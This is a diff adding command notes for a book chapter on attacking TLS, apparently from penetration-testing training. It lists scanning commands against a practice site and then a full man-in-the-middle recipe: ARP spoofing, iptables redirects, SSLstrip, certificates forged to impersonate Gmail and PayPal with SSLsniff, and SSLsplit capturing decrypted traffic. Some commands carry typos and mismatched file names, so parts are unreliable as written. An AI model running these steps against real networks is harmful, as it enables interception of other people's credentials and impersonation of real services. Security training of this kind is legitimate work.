@@ -1,0 +1,81 @@
+
+
+Chapter 8: Exploiting Trust Through Cryptography Testing
+
+Assess Encryption Like a Pro
+
+SSLyze:
+
+sslyze [Options] [host:port | host]
+sslyze --regular --heartbleed www.hackthissite.org:443 >>hackthissite.txt
+
+
+SSLscan:
+
+sslscan [Options] [host:port | host]
+sslscan www.hackthissite.org
+
+
+Using map for SSL ciphers:
+
+nmap -sV --script ssl-enum-ciphers -p 443 www.hackthissite.org
+
+
+Exploiting the Flaws
+
+POODLE scan:
+
+nmap -sV --version-light --script ssl-poodle -p 443 <host>
+Hanging Out as the Man-In-The-Middle
+
+
+SSLstrip prep:
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth0 -t 172.16.30.135 172.16.30.2
+
+IPtables:
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1111
+
+Launching:
+
+sslstrip –l 1111
+
+
+SSLsniff
+
+Generate Certs:
+
+openssl req -config openssl.cnf -new -nodes -keyout <targetsite>.key -out <targetsite>.csr -days 365
+
+Sign and prep cert:
+
+openssl ca -config openssl.cnf -policy policy_anything -out gmail.crt -infiles gmail.csr
+cat paypal.crt gmail.key > gmail.pem
+mkdir -p /usr/share/sslsniff/certs/fakegmail/
+cp gmail.pem /usr/share/sslsniff/certs/fakegmail/
+
+Start SSLsniff:
+
+sslsniff -t -c /usr/share/sslsniff/certs/fakegmail -s 1111 -w /tmp/sslsniff.log -d –p
+
+Arpsoof:
+
+arpspoof –I eth0 –t 172.16.30.135 172.16.30.2
+
+
+IPtables prep:
+
+iptables -t nat -F
+iptables -t nat -A PREROUTING -p tcp –dport 80 -j REDIRECT –to-ports 8080
+iptables -t nat -A PREROUTING -p tcp –dport 443 -j REDIRECT –to-ports 8443
+iptables -I INPUT -p tcp -m state –state NEW -m tcp –dport 80 -j ACCEPT
+iptables -I INPUT -p tcp -m state –state NEW -m tcp –dport 443 -j ACCEPT
+iptables -I INPUT -p tcp -m state –state NEW -m tcp –dport 8443 -j ACCEPT
+iptables -I INPUT -p tcp -m state –state NEW -m tcp –dport 8080 -j ACCEPT
+service iptables save
+
+SSLsplit start:
+
+sslsplit -l connections.log -S ~/scrapes/ -k ~/sslsplit-keys/ca.key -c ~/sslsplit-keys/ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
